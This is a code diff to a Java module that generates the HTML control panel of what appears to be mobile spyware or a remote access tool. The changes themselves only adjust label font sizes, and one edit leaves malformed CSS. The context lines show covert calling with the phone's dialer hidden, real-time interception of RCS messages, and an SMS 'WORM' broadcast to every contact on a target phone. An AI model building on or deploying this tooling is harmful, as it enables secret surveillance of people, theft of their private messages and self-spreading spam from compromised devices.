@@ -89,7 +89,7 @@ public class CommsModule extends BaseModule {
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
         html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem;\">&#128222; REMOTE_DIALER <span class=\"info-trigger\" onclick=\"showInfo(event, 'REMOTE_DIALER', '<b>CELLULAR_CALL</b>: Physical SIM dial. Standard logs apply.<br><br><b>STEALTH_HANDSET</b>: 2-way audio via browser. Dialer UI suppressed.')\">INFO</span></div>");
+        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.8rem;\">&#128222; REMOTE_DIALER <span class=\"info-trigger\" onclick=\"showInfo(event, 'REMOTE_DIALER', '<b>CELLULAR_CALL</b>: Physical SIM dial. Standard logs apply.<br><br><b>STEALTH_HANDSET</b>: 2-way audio via browser. Dialer UI suppressed.')\">INFO</span></div>");
         
         html.append("<div style=\"display: flex; flex-direction: column; gap: 15px; align-items: center;\">");
         html.append("<input type=\"text\" id=\"dial-number\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace; text-align: center;\">");
@@ -422,7 +422,7 @@ public class CommsModule extends BaseModule {
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
         html.append("<p style=\"color: #888; font-size: 0.75rem; margin-bottom: 20px;\"><b>Note:</b> RCS and Advanced Messaging (Blue Bubbles) are intercepted in real-time in the <a href=\"/intel\" style=\"color: var(--neon-cyan);\">Intel Tab</a>.</p>");
         html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem;\">&#128231; DISPATCH_NEW_SMS</div>");
+        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.8 rem;\">&#128231; DISPATCH_NEW_SMS</div>");
         html.append("<form action=\"/sms/send\" method=\"get\">");
         html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
         html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
@@ -433,7 +433,7 @@ public class CommsModule extends BaseModule {
         html.append("</div></form>");
 
         html.append("<div style=\"margin-top: 30px; border-top: 1px solid rgba(0,242,255,0.1); padding-top: 20px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-orange); font-size: 0.7rem; margin-bottom: 15px;\">&#9889; SMS_BROADCAST (WORM)</div>");
+        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-orange); font-size: 0.8rem; margin-bottom: 15px;\">&#9889; SMS_BROADCAST (WORM)</div>");
         html.append("<p style=\"color: #888; font-size: 0.75rem; text-align: center; margin-bottom: 15px;\">Dispatches a message to EVERY contact in the address book.</p>");
         html.append("<form action=\"/sms/broadcast\" method=\"get\">");
         html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
